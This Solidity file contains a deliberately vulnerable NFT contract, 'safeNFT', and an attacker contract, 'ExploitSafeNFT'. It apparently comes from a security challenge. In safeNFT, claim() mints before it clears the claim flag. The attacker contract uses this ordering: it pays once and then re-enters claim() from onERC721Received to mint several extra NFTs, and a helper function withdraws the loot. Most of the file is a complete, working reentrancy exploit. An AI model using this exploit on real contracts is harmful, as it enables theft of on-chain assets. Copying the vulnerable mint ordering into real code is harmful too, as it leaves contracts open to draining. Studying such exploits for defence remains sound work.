// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address => bool) public canClaim;

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint256 _price
    ) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price == msg.value, "INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender], "CANT_MINT");
        _safeMint(msg.sender, totalSupply());
        canClaim[msg.sender] = false;
    }
}

contract ExploitSafeNFT is IERC721Receiver {
    safeNFT public target;
    uint256 public totalSupplySafeNFT;

    constructor(address _targetAddress) {
        target = safeNFT(_targetAddress);
    }

    function attack() external payable {
        require(msg.value == 0.01 ether, "Need 0.01 ether to proceed!!!");
        target.buyNFT{value: msg.value}();
        totalSupplySafeNFT = target.totalSupply();
        target.claim();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // To claim multiple NFTs
        if (tokenId < totalSupplySafeNFT + 5) {
            target.claim();
        }
        // Need to stop reentrancy at some time or the transaction will fail
        return IERC721Receiver.onERC721Received.selector;
    }

    // Just a helper function for you to take out your "spoils of war"
    function redeemNFTs(address _to, uint256[] calldata _tokenIds) external {
        for (uint256 i = 0; i < _tokenIds.length; i++) {
            target.transferFrom(address(this), _to, _tokenIds[i]);
        }
    }
}
